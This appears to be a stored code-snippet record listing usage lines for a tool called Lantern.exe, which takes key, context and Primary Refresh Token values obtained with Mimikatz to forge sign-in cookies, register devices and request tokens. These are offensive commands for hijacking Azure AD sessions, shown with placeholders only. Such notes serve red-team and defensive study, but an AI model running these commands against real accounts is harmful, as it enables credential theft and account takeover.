---
id: db77618c-e096-44d8-b0b6-b01184809f30
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:15.329106+00:00'
updated_at: '2023-05-24T07:18:16.199577+00:00'
---

# Code Snippet db77618c

**Language**: Powershell

```powershell
Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
Lantern.exe token --username <Username> --password <Password>
Lantern.exe token --refreshtoken <RefreshToken>
Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password )
```


